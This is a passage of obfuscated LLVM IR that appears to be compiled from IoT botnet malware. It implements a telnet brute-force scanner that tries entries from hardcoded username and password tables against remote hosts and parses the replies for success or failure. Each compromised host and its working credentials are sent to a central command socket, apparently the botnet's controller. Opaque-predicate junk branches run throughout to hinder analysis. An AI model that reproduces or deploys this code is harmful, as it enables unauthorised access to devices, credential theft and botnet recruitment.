  br i1 %765, label %766, label %786

; <label>:766:                                    ; preds = %741
  %767 = load i32, i32* @x.69
  %768 = load i32, i32* @y.70
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %766
  %775 = load i32, i32* %14, align 4
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %776
  call void @reset_telstate(%struct.telstate_t* %777)
  %778 = load i32, i32* @x.69
  %779 = load i32, i32* @y.70
  %780 = sub i32 %778, 1
  %781 = mul i32 %778, %780
  %782 = urem i32 %781, 2
  %783 = icmp eq i32 %782, 0
  %784 = icmp slt i32 %779, 10
  %785 = or i1 %783, %784
  br i1 %785, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %1509

; <label>:786:                                    ; preds = %741
  %787 = load i32, i32* @x.69
  %788 = load i32, i32* @y.70
  %789 = sub i32 %787, 1
  %790 = mul i32 %787, %789
  %791 = urem i32 %790, 2
  %792 = icmp eq i32 %791, 0
  %793 = icmp slt i32 %788, 10
  %794 = or i1 %792, %793
  br i1 %794, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %786
  %795 = load i32, i32* %14, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 0
  %799 = load i32, i32* %798, align 16
  %800 = call i64 @send(i32 %799, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i32 0, i32 0), i64 2, i32 16384)
  %801 = icmp slt i64 %800, 0
  %802 = load i32, i32* @x.69
  %803 = load i32, i32* @y.70
  %804 = sub i32 %802, 1
  %805 = mul i32 %802, %804
  %806 = urem i32 %805, 2
  %807 = icmp eq i32 %806, 0
  %808 = icmp slt i32 %803, 10
  %809 = or i1 %807, %808
  br i1 %809, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br i1 %801, label %810, label %830

; <label>:810:                                    ; preds = %originalBBpart2119
  %811 = load i32, i32* @x.69
  %812 = load i32, i32* @y.70
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %810
  %819 = load i32, i32* %14, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %820
  call void @reset_telstate(%struct.telstate_t* %821)
  %822 = load i32, i32* @x.69
  %823 = load i32, i32* @y.70
  %824 = sub i32 %822, 1
  %825 = mul i32 %822, %824
  %826 = urem i32 %825, 2
  %827 = icmp eq i32 %826, 0
  %828 = icmp slt i32 %823, 10
  %829 = or i1 %827, %828
  br i1 %829, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br label %1509

; <label>:830:                                    ; preds = %originalBBpart2119
  %831 = load i32, i32* %14, align 4
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %832
  call void @advance_telstate(%struct.telstate_t* %833, i32 4)
  br label %1492

; <label>:834:                                    ; preds = %originalBBpart216
  %835 = load i32, i32* %14, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %836
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %837, i32 0, i32 0
  %839 = load i32, i32* %838, align 16
  %840 = load i32, i32* %11, align 4
  %841 = load i32, i32* %14, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %842
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %843, i32 0, i32 9
  %845 = load i8*, i8** %844, align 8
  %846 = call i32 @read_until_response(i32 %839, i32 %840, i8* %845, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %847 = icmp ne i32 %846, 0
  br i1 %847, label %848, label %887

; <label>:848:                                    ; preds = %834
  %849 = call i64 @time(i64* null) #5
  %850 = trunc i64 %849 to i32
  %851 = load i32, i32* %14, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %852
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %853, i32 0, i32 7
  store i32 %850, i32* %854, align 16
  %855 = load i32, i32* %14, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %856
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %857, i32 0, i32 9
  %859 = load i8*, i8** %858, align 8
  %860 = call i32 @contains_fail(i8* %859)
  %861 = icmp ne i32 %860, 0
  br i1 %861, label %862, label %866

; <label>:862:                                    ; preds = %848
  %863 = load i32, i32* %14, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %864
  call void @advance_telstate(%struct.telstate_t* %865, i32 0)
  br label %886

; <label>:866:                                    ; preds = %848
  %867 = load i32, i32* @x.69
  %868 = load i32, i32* @y.70
  %869 = sub i32 %867, 1
  %870 = mul i32 %867, %869
  %871 = urem i32 %870, 2
  %872 = icmp eq i32 %871, 0
  %873 = icmp slt i32 %868, 10
  %874 = or i1 %872, %873
  br i1 %874, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %866
  %875 = load i32, i32* %14, align 4
  %876 = sext i32 %875 to i64
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %876
  call void @advance_telstate(%struct.telstate_t* %877, i32 5)
  %878 = load i32, i32* @x.69
  %879 = load i32, i32* @y.70
  %880 = sub i32 %878, 1
  %881 = mul i32 %878, %880
  %882 = urem i32 %881, 2
  %883 = icmp eq i32 %882, 0
  %884 = icmp slt i32 %879, 10
  %885 = or i1 %883, %884
  br i1 %885, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  br label %886

; <label>:886:                                    ; preds = %originalBBpart2127, %862
  br label %1509

; <label>:887:                                    ; preds = %834
  %888 = load i32, i32* @x.69
  %889 = load i32, i32* @y.70
  %890 = sub i32 %888, 1
  %891 = mul i32 %888, %890
  %892 = urem i32 %891, 2
  %893 = icmp eq i32 %892, 0
  %894 = icmp slt i32 %889, 10
  %895 = or i1 %893, %894
  br i1 %895, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %887
  %896 = load i32, i32* %14, align 4
  %897 = sext i32 %896 to i64
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %897
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %898, i32 0, i32 7
  %900 = load i32, i32* %899, align 16
  %901 = add i32 %900, 7
  %902 = zext i32 %901 to i64
  %903 = call i64 @time(i64* null) #5
  %904 = icmp slt i64 %902, %903
  %905 = load i32, i32* @x.69
  %906 = load i32, i32* @y.70
  %907 = sub i32 %905, 1
  %908 = mul i32 %905, %907
  %909 = urem i32 %908, 2
  %910 = icmp eq i32 %909, 0
  %911 = icmp slt i32 %906, 10
  %912 = or i1 %910, %911
  br i1 %912, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br i1 %904, label %913, label %917

; <label>:913:                                    ; preds = %originalBBpart2131
  %914 = load i32, i32* %14, align 4
  %915 = sext i32 %914 to i64
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %915
  call void @reset_telstate(%struct.telstate_t* %916)
  br label %917

; <label>:917:                                    ; preds = %913, %originalBBpart2131
  br label %1492

; <label>:918:                                    ; preds = %originalBBpart216
  %919 = load i32, i32* @x.69
  %920 = load i32, i32* @y.70
  %921 = sub i32 %919, 1
  %922 = mul i32 %919, %921
  %923 = urem i32 %922, 2
  %924 = icmp eq i32 %923, 0
  %925 = icmp slt i32 %920, 10
  %926 = or i1 %924, %925
  br i1 %926, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %918
  %927 = load i32, i32* %14, align 4
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 0
  %931 = load i32, i32* %930, align 16
  %932 = load i32, i32* %14, align 4
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %933
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %934, i32 0, i32 5
  %936 = load i8, i8* %935, align 1
  %937 = zext i8 %936 to i64
  %938 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %937
  %939 = load i8*, i8** %938, align 8
  %940 = load i32, i32* %14, align 4
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %941
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %942, i32 0, i32 5
  %944 = load i8, i8* %943, align 1
  %945 = zext i8 %944 to i64
  %946 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %945
  %947 = load i8*, i8** %946, align 8
  %948 = call i64 @strlen(i8* %947) #9
  %949 = call i64 @send(i32 %931, i8* %939, i64 %948, i32 16384)
  %950 = icmp slt i64 %949, 0
  %951 = load i32, i32* @x.69
  %952 = load i32, i32* @y.70
  %953 = sub i32 %951, 1
  %954 = mul i32 %951, %953
  %955 = urem i32 %954, 2
  %956 = icmp eq i32 %955, 0
  %957 = icmp slt i32 %952, 10
  %958 = or i1 %956, %957
  br i1 %958, label %originalBBpart2135, label %originalBB133alteredBB

originalBBpart2135:                               ; preds = %originalBB133
  br i1 %950, label %959, label %963

; <label>:959:                                    ; preds = %originalBBpart2135
  %960 = load i32, i32* %14, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %961
  call void @reset_telstate(%struct.telstate_t* %962)
  br label %1509

; <label>:963:                                    ; preds = %originalBBpart2135
  %964 = load i32, i32* %14, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %965
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %966, i32 0, i32 0
  %968 = load i32, i32* %967, align 16
  %969 = call i64 @send(i32 %968, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i32 0, i32 0), i64 2, i32 16384)
  %970 = icmp slt i64 %969, 0
  br i1 %970, label %971, label %975

; <label>:971:                                    ; preds = %963
  %972 = load i32, i32* %14, align 4
  %973 = sext i32 %972 to i64
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %973
  call void @reset_telstate(%struct.telstate_t* %974)
  br label %1509

; <label>:975:                                    ; preds = %963
  %976 = load i32, i32* %14, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %977
  call void @advance_telstate(%struct.telstate_t* %978, i32 6)
  br label %1492

; <label>:979:                                    ; preds = %originalBBpart216
  %980 = load i32, i32* %14, align 4
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %981
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %982, i32 0, i32 0
  %984 = load i32, i32* %983, align 16
  %985 = load i32, i32* %11, align 4
  %986 = load i32, i32* %14, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %987
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %988, i32 0, i32 9
  %990 = load i8*, i8** %989, align 8
  %991 = call i32 @read_until_response(i32 %984, i32 %985, i8* %990, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %992 = icmp ne i32 %991, 0
  br i1 %992, label %993, label %1160

; <label>:993:                                    ; preds = %979
  %994 = call i64 @time(i64* null) #5
  %995 = trunc i64 %994 to i32
  %996 = load i32, i32* %14, align 4
  %997 = sext i32 %996 to i64
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %997
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %998, i32 0, i32 7
  store i32 %995, i32* %999, align 16
  %1000 = load i32, i32* %14, align 4
  %1001 = sext i32 %1000 to i64
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1001
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1002, i32 0, i32 9
  %1004 = load i8*, i8** %1003, align 8
  %1005 = call i32 @contains_fail(i8* %1004)
  %1006 = icmp ne i32 %1005, 0
  br i1 %1006, label %1007, label %1027

; <label>:1007:                                   ; preds = %993
  %1008 = load i32, i32* @x.69
  %1009 = load i32, i32* @y.70
  %1010 = sub i32 %1008, 1
  %1011 = mul i32 %1008, %1010
  %1012 = urem i32 %1011, 2
  %1013 = icmp eq i32 %1012, 0
  %1014 = icmp slt i32 %1009, 10
  %1015 = or i1 %1013, %1014
  br i1 %1015, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %1007
  %1016 = load i32, i32* %14, align 4
  %1017 = sext i32 %1016 to i64
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1017
  call void @advance_telstate(%struct.telstate_t* %1018, i32 0)
  %1019 = load i32, i32* @x.69
  %1020 = load i32, i32* @y.70
  %1021 = sub i32 %1019, 1
  %1022 = mul i32 %1019, %1021
  %1023 = urem i32 %1022, 2
  %1024 = icmp eq i32 %1023, 0
  %1025 = icmp slt i32 %1020, 10
  %1026 = or i1 %1024, %1025
  br i1 %1026, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br label %1143

; <label>:1027:                                   ; preds = %993
  %1028 = load i32, i32* @x.69
  %1029 = load i32, i32* @y.70
  %1030 = sub i32 %1028, 1
  %1031 = mul i32 %1028, %1030
  %1032 = urem i32 %1031, 2
  %1033 = icmp eq i32 %1032, 0
  %1034 = icmp slt i32 %1029, 10
  %1035 = or i1 %1033, %1034
  br i1 %1035, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %1027
  %1036 = load i32, i32* %14, align 4
  %1037 = sext i32 %1036 to i64
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1037
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1038, i32 0, i32 9
  %1040 = load i8*, i8** %1039, align 8
  %1041 = call i32 @contains_success(i8* %1040)
  %1042 = icmp ne i32 %1041, 0
  %1043 = load i32, i32* @x.69
  %1044 = load i32, i32* @y.70
  %1045 = sub i32 %1043, 1
  %1046 = mul i32 %1043, %1045
  %1047 = urem i32 %1046, 2
  %1048 = icmp eq i32 %1047, 0
  %1049 = icmp slt i32 %1044, 10
  %1050 = or i1 %1048, %1049
  br i1 %1050, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br i1 %1042, label %1051, label %1122

; <label>:1051:                                   ; preds = %originalBBpart2143
  %1052 = load i32, i32* %14, align 4
  %1053 = sext i32 %1052 to i64
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1053
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1054, i32 0, i32 3
  %1056 = load i8, i8* %1055, align 1
  %1057 = zext i8 %1056 to i32
  %1058 = icmp eq i32 %1057, 2
  br i1 %1058, label %1059, label %1063

; <label>:1059:                                   ; preds = %1051
  %1060 = load i32, i32* %14, align 4
  %1061 = sext i32 %1060 to i64
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1061
  call void @advance_telstate(%struct.telstate_t* %1062, i32 7)
  br label %1105

; <label>:1063:                                   ; preds = %1051
  %1064 = load i32, i32* @x.69
  %1065 = load i32, i32* @y.70
  %1066 = sub i32 %1064, 1
  %1067 = mul i32 %1064, %1066
  %1068 = urem i32 %1067, 2
  %1069 = icmp eq i32 %1068, 0
  %1070 = icmp slt i32 %1065, 10
  %1071 = or i1 %1069, %1070
  br i1 %1071, label %originalBB145, label %originalBB145alteredBB

originalBB145:                                    ; preds = %originalBB145alteredBB, %1063
  %1072 = load i32, i32* @mainCommSock, align 4
  %1073 = load i32, i32* %14, align 4
  %1074 = sext i32 %1073 to i64
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1074
  %1076 = call i8* @get_telstate_host(%struct.telstate_t* %1075)
  %1077 = load i32, i32* %14, align 4
  %1078 = sext i32 %1077 to i64
  %1079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1078
  %1080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1079, i32 0, i32 4
  %1081 = load i8, i8* %1080, align 2
  %1082 = zext i8 %1081 to i64
  %1083 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %1082
  %1084 = load i8*, i8** %1083, align 8
  %1085 = load i32, i32* %14, align 4
  %1086 = sext i32 %1085 to i64
  %1087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1086
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1087, i32 0, i32 5
  %1089 = load i8, i8* %1088, align 1
  %1090 = zext i8 %1089 to i64
  %1091 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %1090
  %1092 = load i8*, i8** %1091, align 8
  %1093 = call i32 (i32, i8*, ...) @sockprintf(i32 %1072, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i32 0, i32 0), i8* %1076, i8* %1084, i8* %1092)
  %1094 = load i32, i32* %14, align 4
  %1095 = sext i32 %1094 to i64
  %1096 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1095
  call void @advance_telstate(%struct.telstate_t* %1096, i32 7)
  %1097 = load i32, i32* @x.69
  %1098 = load i32, i32* @y.70
  %1099 = sub i32 %1097, 1
  %1100 = mul i32 %1097, %1099
  %1101 = urem i32 %1100, 2
  %1102 = icmp eq i32 %1101, 0
  %1103 = icmp slt i32 %1098, 10
  %1104 = or i1 %1102, %1103
  br i1 %1104, label %originalBBpart2147, label %originalBB145alteredBB

originalBBpart2147:                               ; preds = %originalBB145
  br label %1105

; <label>:1105:                                   ; preds = %originalBBpart2147, %1059
  %1106 = load i32, i32* @x.69
  %1107 = load i32, i32* @y.70
  %1108 = sub i32 %1106, 1
  %1109 = mul i32 %1106, %1108
  %1110 = urem i32 %1109, 2
  %1111 = icmp eq i32 %1110, 0
  %1112 = icmp slt i32 %1107, 10
  %1113 = or i1 %1111, %1112
  br i1 %1113, label %originalBB149, label %originalBB149alteredBB

originalBB149:                                    ; preds = %originalBB149alteredBB, %1105
  %1114 = load i32, i32* @x.69
  %1115 = load i32, i32* @y.70
  %1116 = sub i32 %1114, 1
  %1117 = mul i32 %1114, %1116
  %1118 = urem i32 %1117, 2
  %1119 = icmp eq i32 %1118, 0
  %1120 = icmp slt i32 %1115, 10
  %1121 = or i1 %1119, %1120
  br i1 %1121, label %originalBBpart2151, label %originalBB149alteredBB

originalBBpart2151:                               ; preds = %originalBB149
  br label %1142

; <label>:1122:                                   ; preds = %originalBBpart2143
  %1123 = load i32, i32* @x.69
  %1124 = load i32, i32* @y.70
  %1125 = sub i32 %1123, 1
  %1126 = mul i32 %1123, %1125
  %1127 = urem i32 %1126, 2
  %1128 = icmp eq i32 %1127, 0
  %1129 = icmp slt i32 %1124, 10
  %1130 = or i1 %1128, %1129
  br i1 %1130, label %originalBB153, label %originalBB153alteredBB

originalBB153:                                    ; preds = %originalBB153alteredBB, %1122
  %1131 = load i32, i32* %14, align 4
  %1132 = sext i32 %1131 to i64
  %1133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1132
  call void @reset_telstate(%struct.telstate_t* %1133)
  %1134 = load i32, i32* @x.69
  %1135 = load i32, i32* @y.70
  %1136 = sub i32 %1134, 1
  %1137 = mul i32 %1134, %1136
  %1138 = urem i32 %1137, 2
  %1139 = icmp eq i32 %1138, 0
  %1140 = icmp slt i32 %1135, 10
  %1141 = or i1 %1139, %1140
  br i1 %1141, label %originalBBpart2155, label %originalBB153alteredBB

originalBBpart2155:                               ; preds = %originalBB153
  br label %1142

; <label>:1142:                                   ; preds = %originalBBpart2155, %originalBBpart2151
  br label %1143

; <label>:1143:                                   ; preds = %1142, %originalBBpart2139
  %1144 = load i32, i32* @x.69
  %1145 = load i32, i32* @y.70
  %1146 = sub i32 %1144, 1
  %1147 = mul i32 %1144, %1146
  %1148 = urem i32 %1147, 2
  %1149 = icmp eq i32 %1148, 0
  %1150 = icmp slt i32 %1145, 10
  %1151 = or i1 %1149, %1150
  br i1 %1151, label %originalBB157, label %originalBB157alteredBB

originalBB157:                                    ; preds = %originalBB157alteredBB, %1143
  %1152 = load i32, i32* @x.69
  %1153 = load i32, i32* @y.70
  %1154 = sub i32 %1152, 1
  %1155 = mul i32 %1152, %1154
  %1156 = urem i32 %1155, 2
  %1157 = icmp eq i32 %1156, 0
  %1158 = icmp slt i32 %1153, 10
  %1159 = or i1 %1157, %1158
  br i1 %1159, label %originalBBpart2159, label %originalBB157alteredBB

originalBBpart2159:                               ; preds = %originalBB157
  br label %1509

; <label>:1160:                                   ; preds = %979
  %1161 = load i32, i32* %14, align 4
  %1162 = sext i32 %1161 to i64
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1162
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1163, i32 0, i32 7
  %1165 = load i32, i32* %1164, align 16
  %1166 = add i32 %1165, 7
  %1167 = zext i32 %1166 to i64
  %1168 = call i64 @time(i64* null) #5
  %1169 = icmp slt i64 %1167, %1168
  br i1 %1169, label %1170, label %1190

; <label>:1170:                                   ; preds = %1160
  %1171 = load i32, i32* @x.69
  %1172 = load i32, i32* @y.70
  %1173 = sub i32 %1171, 1
  %1174 = mul i32 %1171, %1173
  %1175 = urem i32 %1174, 2
  %1176 = icmp eq i32 %1175, 0
  %1177 = icmp slt i32 %1172, 10
  %1178 = or i1 %1176, %1177
  br i1 %1178, label %originalBB161, label %originalBB161alteredBB

originalBB161:                                    ; preds = %originalBB161alteredBB, %1170
  %1179 = load i32, i32* %14, align 4
  %1180 = sext i32 %1179 to i64
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1180
  call void @reset_telstate(%struct.telstate_t* %1181)
  %1182 = load i32, i32* @x.69
  %1183 = load i32, i32* @y.70
  %1184 = sub i32 %1182, 1
  %1185 = mul i32 %1182, %1184
  %1186 = urem i32 %1185, 2
  %1187 = icmp eq i32 %1186, 0
  %1188 = icmp slt i32 %1183, 10
  %1189 = or i1 %1187, %1188
  br i1 %1189, label %originalBBpart2163, label %originalBB161alteredBB

originalBBpart2163:                               ; preds = %originalBB161
  br label %1190

; <label>:1190:                                   ; preds = %originalBBpart2163, %1160
  br label %1492

; <label>:1191:                                   ; preds = %originalBBpart216
  %1192 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %1193 = call i32 (i8*, i8*, ...) @sprintf(i8* %1192, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.117, i32 0, i32 0), i8** getelementptr inbounds ([10 x i8*], [10 x i8*]* @tempdirs, i32 0, i32 0)) #5
  %1194 = load i32, i32* %14, align 4
  %1195 = sext i32 %1194 to i64
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1195
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1196, i32 0, i32 0
  %1198 = load i32, i32* %1197, align 16
  %1199 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %1200 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i32 0, i32 0
  %1201 = call i64 @strlen(i8* %1200) #9
  %1202 = call i64 @send(i32 %1198, i8* %1199, i64 %1201, i32 16384)
  %1203 = icmp slt i64 %1202, 0
  br i1 %1203, label %1204, label %1208

; <label>:1204:                                   ; preds = %1191
  %1205 = load i32, i32* %14, align 4
  %1206 = sext i32 %1205 to i64
  %1207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1206
  call void @reset_telstate(%struct.telstate_t* %1207)
  br label %1509

; <label>:1208:                                   ; preds = %1191
  %1209 = call i32 (...) @RemoveTempDirs()
  %1210 = load i32, i32* @mainCommSock, align 4
  %1211 = load i32, i32* %14, align 4
  %1212 = sext i32 %1211 to i64
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1212
  %1214 = call i8* @get_telstate_host(%struct.telstate_t* %1213)
  %1215 = load i32, i32* %14, align 4
  %1216 = sext i32 %1215 to i64
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1216
  %1218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1217, i32 0, i32 4
  %1219 = load i8, i8* %1218, align 2
  %1220 = zext i8 %1219 to i64
  %1221 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %1220
  %1222 = load i8*, i8** %1221, align 8
  %1223 = load i32, i32* %14, align 4
  %1224 = sext i32 %1223 to i64
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1224
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1225, i32 0, i32 5
  %1227 = load i8, i8* %1226, align 1
  %1228 = zext i8 %1227 to i64
  %1229 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %1228
  %1230 = load i8*, i8** %1229, align 8
  %1231 = call i32 (i32, i8*, ...) @sockprintf(i32 %1210, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.118, i32 0, i32 0), i8* %1214, i8* %1222, i8* %1230)
  %1232 = load i32, i32* %14, align 4
  %1233 = sext i32 %1232 to i64
  %1234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1233
  call void @advance_telstate(%struct.telstate_t* %1234, i32 8)
  br label %1492

; <label>:1235:                                   ; preds = %originalBBpart216
  %1236 = load i32, i32* @x.69
  %1237 = load i32, i32* @y.70
  %1238 = sub i32 %1236, 1
  %1239 = mul i32 %1236, %1238
  %1240 = urem i32 %1239, 2
  %1241 = icmp eq i32 %1240, 0
  %1242 = icmp slt i32 %1237, 10
  %1243 = or i1 %1241, %1242
  br i1 %1243, label %originalBB165, label %originalBB165alteredBB

originalBB165:                                    ; preds = %originalBB165alteredBB, %1235
  %1244 = call i64 @time(i64* null) #5
  %1245 = trunc i64 %1244 to i32
  %1246 = load i32, i32* %14, align 4
  %1247 = sext i32 %1246 to i64
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1247
  %1249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1248, i32 0, i32 7
  store i32 %1245, i32* %1249, align 16
  %1250 = load i32, i32* %14, align 4
  %1251 = sext i32 %1250 to i64
  %1252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1251
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1252, i32 0, i32 0
  %1254 = load i32, i32* %1253, align 16
  %1255 = call i64 @send(i32 %1254, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i32 0, i32 0), i64 4, i32 16384)
  %1256 = icmp slt i64 %1255, 0
  %1257 = load i32, i32* @x.69
  %1258 = load i32, i32* @y.70
  %1259 = sub i32 %1257, 1
  %1260 = mul i32 %1257, %1259
  %1261 = urem i32 %1260, 2
  %1262 = icmp eq i32 %1261, 0
  %1263 = icmp slt i32 %1258, 10
  %1264 = or i1 %1262, %1263
  br i1 %1264, label %originalBBpart2167, label %originalBB165alteredBB

originalBBpart2167:                               ; preds = %originalBB165
  br i1 %1256, label %1265, label %1266

; <label>:1265:                                   ; preds = %originalBBpart2167
  br label %1266

; <label>:1266:                                   ; preds = %1265, %originalBBpart2167
  %1267 = load i32, i32* %14, align 4
  %1268 = sext i32 %1267 to i64
  %1269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i64 %1268
  %1270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1269, i32 0, i32 0
  %1271 = load i32, i32* %1270, align 16
  %1272 = call i64 @send(i32 %1271, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.120, i32 0, i32 0), i64 7, i32 16384)
  %1273 = icmp slt i64 %1272, 0
  br i1 %1273, label %1274, label %1275

; <label>:1274:                                   ; preds = %1266
  br label %1275

